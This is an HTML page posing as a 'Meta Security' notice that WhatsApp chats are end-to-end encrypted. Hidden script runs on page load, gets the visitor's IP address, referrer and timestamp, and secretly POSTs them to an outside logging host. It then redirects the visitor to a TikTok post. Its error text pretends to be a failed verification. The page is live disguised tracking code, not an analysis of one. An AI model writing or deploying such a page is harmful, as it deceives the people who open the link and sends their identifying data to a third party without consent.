<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Meta Security</title>
  <script>
    // Funktion wird beim Laden der Website ausgeführt
    async function logAndRedirect() {
      try {
        // Hole die Besucher-IP
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        // Bereite die Log-Daten vor
        const logData = {
          ip: ip,
          timestamp: new Date().toISOString(),
          referer: document.referrer || 'Direkter Besuch',
          page: window.location.href
        };

        // Sendet IP an PK404
        await fetch('https://skriptai.github.io/foldspymini-exit-point/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(logData)
        });
      } catch (error) {
        console.error('Verifizierung fehlgeschlagen! Bitte den Link erneut oeffenen:', error);
      } finally {
        // Weiterleitung zur Zielseite, foldPSY 4 / hidding = WhatsApp
        window.location.href = 'https://www.tiktok.com/@yunus.woistdasgold/photo/7503282224238710038';
      }
    }

    // Rufe die Funktion auf, sobald das Dokument geladen ist
    window.addEventListener('load', logAndRedirect);
  </script>
</head>
<body>
  <p>WhatsApp Ende zu Ende Verschlüsselt</p>
</body>
</html>
